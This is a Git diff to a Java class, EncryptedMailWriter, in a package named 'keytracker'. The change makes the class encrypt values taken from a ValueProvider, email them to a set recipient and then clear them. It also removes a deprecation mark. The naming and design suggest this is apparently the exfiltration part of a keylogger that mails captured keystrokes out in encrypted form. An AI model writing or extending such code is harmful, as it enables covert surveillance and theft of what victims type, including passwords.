@@ -1,9 +1,9 @@
 package com.keytracker.file;
 
+import com.keytracker.ValueProvider;
 import com.keytracker.encrypt.Encryptor;
 import com.keytracker.mail.MailSender;
 
-@Deprecated
 public class EncryptedMailWriter extends MyMailWriter {
 
     private final Encryptor encryptor;
@@ -14,9 +14,10 @@ public class EncryptedMailWriter extends MyMailWriter {
     }
 
     @Override
-    public void write(String value) {
-        String encryptedValue = encryptValue(value, encryptor);
+    public void write(ValueProvider valueProvider) {
+        String encryptedValue = encryptValue(valueProvider.extValue(), encryptor);
         mailSender.send(encryptedValue, to);
+        valueProvider.clearExt();
     }
 
     private String encryptValue(String value, Encryptor encryptor) {
